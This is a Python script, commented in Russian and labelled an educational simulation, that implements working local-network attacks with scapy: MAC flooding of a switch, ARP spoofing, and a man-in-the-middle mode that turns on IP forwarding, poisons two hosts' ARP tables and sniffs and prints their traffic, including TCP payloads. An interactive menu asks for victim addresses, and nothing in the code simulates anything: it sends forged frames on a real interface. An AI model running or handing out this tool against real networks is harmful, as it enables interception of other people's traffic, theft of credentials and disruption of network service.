"""
СИМУЛЯЦИЯ МЕТОДОВ ПЕРЕХВАТА ТРАФИКА В ETHERNET
Windows-совместимая версия
"""

import socket
import struct
import time
import threading
import os
import sys
from scapy.all import Ether, ARP, Raw, sendp, send, srp, sniff, get_if_hwaddr
from scapy.all import conf, TCP, UDP, IP

# Для работы требуется установить: pip install scapy
# На Windows также может потребоваться Npcap: https://npcap.com

class NetworkAttacker:
    def __init__(self, interface=None):
        """
        Инициализация атакующего
        :param interface: сетевой интерфейс (например, 'eth0', 'wlan0' или 'Wi-Fi')
        """
        self.interface = interface
        self.my_mac = None
        
        # Получаем список доступных интерфейсов
        print("[*] Доступные интерфейсы:")
        for iface in conf.ifaces.values():
            if hasattr(iface, 'name') and iface.name:
                print(f"    - {iface.name}")
        
        # Если интерфейс не указан, используем первый непетлевой
        if not interface:
            for iface in conf.ifaces.values():
                if hasattr(iface, 'name') and iface.name and 'loopback' not in iface.name.lower():
                    self.interface = iface.name
                    break
        
        if self.interface:
            try:
                self.my_mac = get_if_hwaddr(self.interface)
                print(f"[*] Выбран интерфейс: {self.interface}")
                print(f"[*] Ваш MAC-адрес: {self.my_mac}")
            except Exception as e:
                print(f"[!] Ошибка получения MAC: {e}")
                self.my_mac = "00:00:00:00:00:00"
        
    def check_admin(self):
        """Проверка прав администратора (Windows) или root (Unix)"""
        if os.name == 'nt':  # Windows
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:  # Unix/Linux
            return os.geteuid() == 0
    
    def get_mac(self, ip):
        """
        Получение MAC-адреса по IP через ARP-запрос
        """
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            print(f"[!] Ошибка получения MAC для {ip}: {e}")
        return None
    
    def mac_flooding(self, target_mac, duration=30):
        """
        МЕТОД 1: MAC flooding (отравление таблицы коммутатора)
        """
        print(f"\n[+] Запуск MAC flooding на {duration} секунд...")
        print("[!] Коммутатор начинает заполнять таблицу поддельными записями")
        
        if not self.interface:
            print("[!] Интерфейс не задан")
            return
        
        end_time = time.time() + duration
        packet_count = 0
        
        def generate_random_mac():
            """Генерация случайного MAC-адреса"""
            return f"00:11:22:{os.urandom(3).hex()}"
        
        try:
            while time.time() < end_time:
                fake_mac = generate_random_mac()
                packet = Ether(src=fake_mac, dst=target_mac) / f"Fake packet {packet_count}"
                sendp(packet, iface=self.interface, verbose=False)
                packet_count += 1
                if packet_count % 100 == 0:
                    print(f"[*] Отправлено {packet_count} фреймов с поддельными MAC")
        except KeyboardInterrupt:
            print("\n[!] Прервано пользователем")
        except Exception as e:
            print(f"[!] Ошибка: {e}")
        
        print(f"[+] MAC flooding завершён. Отправлено {packet_count} пакетов")
    
    def arp_spoof(self, target_ip, spoof_ip, stop_event=None):
        """
        МЕТОД 2: ARP spoofing (отравление ARP-таблицы)
        """
        if not self.my_mac:
            print("[!] MAC-адрес не определён")
            return
        
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            print(f"[!] Не удалось получить MAC для {target_ip}")
            print("[*] Попытка продолжить с широковещательным MAC...")
            target_mac = "ff:ff:ff:ff:ff:ff"
        
        print(f"[+] ARP spoof: {target_ip} -> думает, что {spoof_ip} = {self.my_mac}")
        
        arp_response = ARP(
            op=2,
            psrc=spoof_ip,
            pdst=target_ip,
            hwdst=target_mac,
            hwsrc=self.my_mac
        )
        
        packet_count = 0
        while not (stop_event and stop_event.is_set()):
            try:
                send(arp_response, iface=self.interface, verbose=False)
                packet_count += 1
                if packet_count % 5 == 0:
                    print(f"[*] Отправлено {packet_count} ARP-ответов на {target_ip}")
                time.sleep(2)
            except Exception as e:
                print(f"[!] Ошибка отправки ARP: {e}")
                time.sleep(2)
        
        print(f"[*] ARP spoof на {target_ip} остановлен. Отправлено {packet_count} пакетов")
    
    def enable_ip_forwarding_windows(self):
        """Включение IP forwarding на Windows"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            print("[*] IP forwarding включён (требуется перезагрузка для полного эффекта)")
            return True
        except Exception as e:
            print(f"[!] Не удалось включить IP forwarding: {e}")
            return False
    
    def disable_ip_forwarding_windows(self):
        """Выключение IP forwarding на Windows"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            print("[*] IP forwarding выключен")
        except Exception as e:
            print(f"[!] Ошибка: {e}")
    
    def packet_callback(self, packet, host1_ip, host2_ip):
        """Обработчик перехваченных пакетов"""
        if packet.haslayer(ARP):
            return
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            if (src == host1_ip and dst == host2_ip) or (src == host2_ip and dst == host1_ip):
                print(f"\n[!] ПЕРЕХВАЧЕНО: {src} -> {dst}")
                if packet.haslayer(TCP):
                    print(f"    TCP порт: {packet[TCP].sport} -> {packet[TCP].dport}")
                    if packet.haslayer(Raw):
                        try:
                            data = packet[Raw].load[:100]
                            print(f"    Данные: {data}")
                        except:
                            pass
                elif packet.haslayer(UDP):
                    print(f"    UDP порт: {packet[UDP].sport} -> {packet[UDP].dport}")
    
    def mitm_attack(self, host1_ip, host2_ip, duration=60):
        """
        МЕТОД 3: Man-in-the-Middle
        """
        print(f"\n[+] Запуск MITM атаки между {host1_ip} и {host2_ip}")
        print(f"[*] Атакующий становится посередине")
        
        # На Windows IP forwarding работает иначе
        if os.name == 'nt':
            self.enable_ip_forwarding_windows()
            print("[!] На Windows перезагрузите компьютер после атаки для отключения forwarding")
        else:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        stop_event1 = threading.Event()
        stop_event2 = threading.Event()
        
        thread1 = threading.Thread(target=self.arp_spoof, args=(host1_ip, host2_ip, stop_event1), daemon=True)
        thread2 = threading.Thread(target=self.arp_spoof, args=(host2_ip, host1_ip, stop_event2), daemon=True)
        
        thread1.start()
        thread2.start()
        
        print(f"[*] Перехват трафика на {duration} секунд...")
        print("[*] Нажмите Ctrl+C для досрочного завершения\n")
        
        try:
            sniff(iface=self.interface, prn=lambda p: self.packet_callback(p, host1_ip, host2_ip), timeout=duration, store=False)
        except KeyboardInterrupt:
            print("\n[!] Прервано пользователем")
        except Exception as e:
            print(f"[!] Ошибка сниффинга: {e}")
        
        print("\n[*] Останавливаем MITM атаку...")
        stop_event1.set()
        stop_event2.set()
        
        thread1.join(timeout=2)
        thread2.join(timeout=2)
        
        self.restore_arp(host1_ip, host2_ip)
        print("[+] MITM атака завершена")
    
    def restore_arp(self, host1_ip, host2_ip):
        """Восстановление ARP-таблиц"""
        print("[*] Восстановление ARP-таблиц...")
        
        host1_mac = self.get_mac(host1_ip)
        host2_mac = self.get_mac(host2_ip)
        
        if host1_mac and host2_mac:
            try:
                send(ARP(op=2, psrc=host2_ip, pdst=host1_ip, hwdst=host1_mac, hwsrc=host2_mac), iface=self.interface, verbose=False, count=3)
                send(ARP(op=2, psrc=host1_ip, pdst=host2_ip, hwdst=host2_mac, hwsrc=host1_mac), iface=self.interface, verbose=False, count=3)
                print("[+] ARP-таблицы восстановлены")
            except Exception as e:
                print(f"[!] Ошибка восстановления: {e}")
        else:
            print("[!] Не удалось восстановить ARP-таблицы автоматически")

def get_local_ips():
    """Получение локальных IP-адресов"""
    ips = []
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
    except:
        pass
    
    # Добавляем стандартные шлюзы
    ips.append("192.168.1.1")
    ips.append("192.168.0.1")
    ips.append("10.0.0.1")
    
    return list(set(ips))

def main():
    print("="*60)
    print("  УЧЕБНАЯ ПРОГРАММА: ПЕРЕХВАТ ТРАФИКА В ETHERNET")
    print("  Демонстрация MAC flooding, ARP spoofing и MITM")
    print("="*60)
    
    attacker = NetworkAttacker()
    
    # Проверка прав администратора
    if not attacker.check_admin():
        print("\n[!] ВНИМАНИЕ: Программа требует прав администратора!")
        print("    На Windows: запустите PowerShell или командную строку от имени администратора")
        print("    Затем выполните: python main.py")
        response = input("\n[?] Продолжить без прав администратора? (y/N): ")
        if response.lower() != 'y':
            sys.exit(1)
    
    if not attacker.interface:
        print("\n[!] Не удалось определить сетевой интерфейс")
        print("[*] Укажите интерфейс вручную (например, 'Wi-Fi' или 'Ethernet')")
        attacker.interface = input("[?] Имя интерфейса: ")
        if attacker.interface:
            try:
                attacker.my_mac = get_if_hwaddr(attacker.interface)
            except:
                print("[!] Неверный интерфейс")
                sys.exit(1)
    
    print("\nДоступные методы:")
    print("1. MAC flooding (отравление таблицы коммутатора)")
    print("2. ARP spoofing (одиночная подмена)")
    print("3. MITM (человек посередине) - полный перехват трафика")
    print("4. Выход")
    
    choice = input("\n[?] Выберите метод (1-4): ")
    
    if choice == "1":
        target_mac = input("MAC-адрес цели (например, aa:bb:cc:dd:ee:ff): ")
        if not target_mac:
            target_mac = "ff:ff:ff:ff:ff:ff"
        duration = input("Длительность атаки (сек) [30]: ")
        duration = int(duration) if duration else 30
        attacker.mac_flooding(target_mac, duration)
        
    elif choice == "2":
        target_ip = input("IP-адрес жертвы (например, 192.168.1.10): ")
        spoof_ip = input("Какой IP подменить (например, IP шлюза 192.168.1.1): ")
        duration = input("Длительность (сек) [20]: ")
        duration = int(duration) if duration else 20
        
        print(f"\n[*] Запуск ARP spoof на {duration} секунд...")
        stop_event = threading.Event()
        thread = threading.Thread(target=attacker.arp_spoof, args=(target_ip, spoof_ip, stop_event))
        thread.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[!] Прервано")
        finally:
            stop_event.set()
            thread.join(timeout=3)
        print("[*] ARP spoof завершён")
        
    elif choice == "3":
        print("\n[*] Примеры IP для вашей сети:")
        local_ips = get_local_ips()
        for ip in local_ips[:5]:
            print(f"    - {ip}")
        
        host1 = input("\nIP первого хоста (жертва 1): ")
        host2 = input("IP второго хоста (жертва 2, часто шлюз): ")
        duration = input("Длительность перехвата (сек) [30]: ")
        duration = int(duration) if duration else 30
        
        attacker.mitm_attack(host1, host2, duration)
        
    else:
        print("Выход")

if __name__ == "__main__":
    main()